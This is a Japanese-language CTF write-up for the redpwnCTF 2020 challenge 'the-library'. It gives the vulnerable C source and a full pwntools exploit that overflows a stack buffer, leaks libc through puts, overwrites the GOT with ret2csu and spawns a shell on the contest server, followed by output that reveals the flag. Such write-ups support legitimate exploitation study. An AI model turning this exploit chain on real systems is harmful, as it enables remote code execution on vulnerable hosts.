# the-library (249 solves / 424 points)

> There's not a lot of useful functions in the binary itself. I wonder where you can get some...

libc.so.6, the-library, the-library.cが添付されていた。

## solution

the-library.cの内容は以下の通り

```c
#include <stdio.h>
#include <string.h>

int main(void)
{
  char name[16];

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts("Welcome to the library... What's your name?");

  read(0, name, 0x100);
  puts("Hello there: ");
  puts(name);
}
```

BOFの脆弱性がある。libcがわかっているためlibcのベースアドレスをリークさせて`system('/bin/sh')`を実行させるだけでいい

```python
# solve.py
from pwn import *

elf = ELF('./the-library')
libc = ELF('./libc.so.6')

offset = 24

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
read_got = elf.got['read']
ret_gadget = 0x400506
pop_rdi = 0x400733
pop_regs = 0x40072a
call_r12 = 0x400710

payload = b'A' * offset
# leak libc
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
# ret2csu -> GOT overwrite
payload += p64(pop_regs)
payload += p64(0x0)      # rbx
payload += p64(0x1)      # rbp
payload += p64(read_got) # r12 => func addr
payload += p64(0x0)      # r13 => rdi
payload += p64(puts_got) # r14 => rsi
payload += p64(0x10)     # r15 => rdx
payload += p64(call_r12)
payload += p64(0xdeadbeef) # dummy (add rsp, 0x8)
payload += p64(0x0) # rbx
payload += p64(0x0) # rbp
payload += p64(0x0) # r12
payload += p64(0x0) # r13
payload += p64(0x0) # r14
payload += p64(0x0) # r15
payload += p64(ret_gadget) # rsp align
# exec system('/bin/sh')
payload += p64(pop_rdi)
payload += p64(puts_got + 8) # rdi <= '/bin/sh'
payload += p64(puts_plt)

#p = process('./the-library')
p = remote('2020.redpwnc.tf', 31350)

p.readuntil('What\'s your name?')
p.sendline(payload)
p.readlines(3)

libc_puts = u64(p.readline().strip().ljust(8, b'\x00'))
libc_base = libc_puts - libc.symbols['puts']
libc_system = libc_base + libc.symbols['system']
libc_binsh = libc_base + next(libc.search(b'/bin/sh'))

log.info(f"libc = {hex(libc_base)}")

payload = p64(libc_system) + b'/bin/sh\x00'
p.sendline(payload)

p.interactive()
```

流れを簡単に説明すると
1. putsのgotアドレスを表示させることで、libcをリークする。
2. __libc_csu_initを使いread関数を呼び出し、putsのgotをsystem関数のアドレスに書き換える。
3. putsのpltを呼び出し、system関数を実行する。

このようなことを行なっている。

```
$ python solve.py
...
[+] Opening connection to 2020.redpwnc.tf on port 31350: Done
[*] libc = 0x7fb4ed95e000
[*] Switching to interactive mode
$ ls
Makefile
bin
dev
flag.txt
lib
lib32
lib64
libc.so.6
the-library
the-library.c
$ cat flag.txt
flag{jump_1nt0_th3_l1brary}
$
```
